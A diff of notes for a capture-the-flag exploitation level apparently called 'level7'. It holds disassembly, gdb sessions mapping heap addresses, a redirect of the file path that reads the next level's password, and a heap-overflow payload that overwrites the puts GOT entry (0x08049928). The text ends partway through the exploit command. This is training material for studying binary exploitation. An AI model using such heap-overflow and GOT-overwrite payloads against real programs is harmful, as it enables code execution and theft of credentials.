@@ -1,49 +1,58 @@
-echo Coucou > /tmp/exploit.txt
-chmod 777 /tmp/exploit.txt
+# Malloc
+
+objdump -d level7
+    [...]
+    8048531:       e8 ba fe ff ff          call   80483f0 <malloc@plt>
+    8048536:       89 44 24 1c             mov    %eax,0x1c(%esp)
+    [...]
+(gdb)break *0x8048536
+    134520840 --> 0x804A008
+
+(gdb)break *0x8048550
+    134520856 --> 0x804A0180
+(gdb)break *0x8048565
+    134520872 --> 0x804A028
+(gdb)break *0x804857f
+    134520888 --> 0x804A038
+
+
+# FakeToken
+
+echo FakeToken > /tmp/.pass
+chmod 777 /tmp/.pass
+
+objdump -d level7
+    [...]
+    80485d0:       89 04 24                mov    %eax,(%esp)
+    80485d3:       e8 58 fe ff ff          call   8048430 <fopen@plt>
+    80485d8:       89 44 24 08             mov    %eax,0x8(%esp)
+    [...]
 (gdb) break *0x80485d0
 (gdb) run x x
-(gdb) info registers 
-eax            0x80486eb        134514411
-ecx            0xbffff913       -1073743597
-edx            0x80486e9        134514409
-ebx            0xb7fd0ff4       -1208152076
-esp            0xbffff710       0xbffff710
-ebp            0xbffff738       0xbffff738
-esi            0x0      0
-edi            0x0      0
-eip            0x80485d0        0x80485d0 <main+175>
-eflags         0x200246 [ PF ZF IF ID ]
-cs             0x73     115
-ss             0x7b     123
-ds             0x7b     123
-es             0x7b     123
-fs             0x0      0
-gs             0x33     51
-(gdb) x/s 0x80486eb
-0x80486eb:       "/home/user/level8/.pass"
-(gdb) set (char[17])*0x80486eb="/tmp/exploit.txt"
-(gdb) x/s 0x80486eb
-0x80486eb:       "/tmp/exploit.txt"
-(gdb) break *0x80485f0
-(gdb) info registers 
-eax            0x8049960        134519136
-ecx            0xb7fda007       -1208115193
-edx            0x804a0e0        134521056
-ebx            0xb7fd0ff4       -1208152076
-esp            0xbffff710       0xbffff710
-ebp            0xbffff738       0xbffff738
-esi            0x0      0
-edi            0x0      0
-eip            0x80485f0        0x80485f0 <main+207>
-eflags         0x200286 [ PF SF IF ID ]
-cs             0x73     115
-ss             0x7b     123
-ds             0x7b     123
-es             0x7b     123
-fs             0x0      0
-gs             0x33     51
-(gdb) x/s 0x8049960
-0x8049960 <c>:   "Coucou\n"
+(gdb) x/s $eax
+    0x80486eb:       "/home/user/level8/.pass"
+(gdb) set (char[11])*0x80486eb="/tmp/.pass"
+(gdb) x/s $eax
+    0x80486eb:       "/tmp/.pass"
+
+# Segmentation fault (core dumped)
+
+(gdb) run $(python2.7 -c 'print("B"*8)') x
+
+(gdb) x/12 0x804a008
+    0x804a008:      0x00000001      0x0804a018      0x00000000      0x00000011
+    0x804a018:      0x42424242      0x42424242      0x00000000      0x00000011
+    0x804a028:      0x00000002      0x0804a038      0x00000000      0x00000011
+
+[...]
+08048400 <puts@plt>:
+ 8048400:       ff 25 28 99 04 08       jmp    *0x8049928
+[...]
+080484f4 <m>:
+ 80484f4:       55                      push   %ebp
+[...]
+
+run 
 
 ./level7 \
     $(python2.7 -c 'print("B"*20 + "\x28\x99\x04\x08")') \
